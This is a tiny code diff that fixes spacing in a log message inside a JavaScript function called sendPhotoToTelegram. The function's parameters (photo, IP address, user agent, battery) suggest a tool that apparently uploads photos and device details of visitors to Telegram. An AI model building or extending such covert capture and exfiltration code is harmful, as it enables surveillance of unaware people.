@@ -38,7 +38,7 @@ function sendPhotoToTelegram(photoPath, ip, userAgent, battery) {
     if (err) {
       console.error('Upload failed:', err);
     } else {
-      console.log('Upload successful!  Server responded with:', body);
+      console.log('Upload successful! Server responded with:', body);
     }
   });
 }
